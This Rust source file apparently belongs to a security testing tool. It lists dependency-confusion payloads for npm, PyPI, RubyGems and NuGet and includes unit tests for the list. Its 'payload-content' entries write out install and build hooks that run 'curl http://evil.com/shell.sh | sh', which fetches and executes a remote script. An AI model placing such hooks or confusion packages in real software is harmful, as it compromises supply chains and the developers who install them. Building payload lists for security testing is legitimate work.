use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    payload_vec!(PayloadType::DepConfusion,
        "npm", [
            ("package-name", "Publish to npm with higher version than internal", Severity::Critical),
            ("@scope/internal-package", "Scoped package confusion targeting internal scope", Severity::Critical),
            ("internal-lib", "Common internal library naming convention", Severity::High),
            ("company-sdk", "SDK confusion targeting internal SDK name", Severity::High),
            ("core-module", "Core module confusion targeting internal dependency", Severity::Critical),
        ];
        "pypi", [
            ("internal-package", "Publish to PyPI with higher version than internal", Severity::Critical),
            ("company-sdk", "Python SDK confusion targeting internal name", Severity::High),
            ("core-lib", "Core library confusion targeting internal dependency", Severity::Critical),
            ("shared-utils", "Shared utilities confusion targeting internal package", Severity::High),
            ("auth-module", "Auth module confusion targeting internal auth library", Severity::Critical),
        ];
        "rubygems", [
            ("internal-gem", "Publish to RubyGems with higher version than internal", Severity::Critical),
            ("company-auth", "Auth gem confusion targeting internal gem name", Severity::High),
            ("core-engine", "Core engine confusion targeting internal dependency", Severity::Critical),
            ("shared-lib", "Shared library confusion targeting internal gem", Severity::High),
            ("utils-gem", "Utils gem confusion targeting internal utility gem", Severity::Medium),
        ];
        "nuget", [
            ("Internal.Package", "Publish to NuGet with higher version than internal", Severity::Critical),
            ("Company.SDK", "SDK confusion targeting internal NuGet package", Severity::High),
            ("Core.Module", "Core module confusion targeting internal dependency", Severity::Critical),
            ("Shared.Library", "Shared library confusion targeting internal library", Severity::High),
            ("Auth.Helper", "Auth helper confusion targeting internal auth package", Severity::Critical),
        ];
        "payload-content", [
            ("{\"scripts\":{\"postinstall\":\"curl http://evil.com/shell.sh | sh\"}}", "npm postinstall script for remote shell execution", Severity::Critical),
            ("from setuptools import setup; setup(name='pkg', scripts=['evil.py'])", "Python setup.py with malicious script entry point", Severity::Critical),
            ("system('curl http://evil.com/shell.sh | sh')", "Ruby gem install hook for remote shell execution", Severity::Critical),
            ("<PreBuildEvent>curl http://evil.com/shell.sh | sh</PreBuildEvent>", ".NET pre-build event for remote shell execution", Severity::Critical),
            ("#system(\"/bin/sh -c 'curl http://evil.com/shell.sh | sh'\")", "Swift package post-install command for remote shell", Severity::Critical),
        ];
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(
            !payloads.is_empty(),
            "Dependency confusion payloads must not be empty"
        );
    }

    #[test]
    fn all_payloads_are_dep_confusion_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::DepConfusion);
        }
    }

    #[test]
    fn contains_npm_payloads() {
        let payloads = get_payloads();
        let has_npm = payloads.iter().any(|p| p.tags.contains(&"npm".to_string()));
        assert!(has_npm, "Must contain npm dependency confusion payloads");
    }

    #[test]
    fn contains_pypi_payloads() {
        let payloads = get_payloads();
        let has_pypi = payloads
            .iter()
            .any(|p| p.tags.contains(&"pypi".to_string()));
        assert!(has_pypi, "Must contain PyPI dependency confusion payloads");
    }

    #[test]
    fn contains_rubygems_payloads() {
        let payloads = get_payloads();
        let has_rubygems = payloads
            .iter()
            .any(|p| p.tags.contains(&"rubygems".to_string()));
        assert!(
            has_rubygems,
            "Must contain RubyGems dependency confusion payloads"
        );
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 15,
            "Must have substantial dependency confusion payload coverage, got {}",
            payloads.len()
        );
    }
}
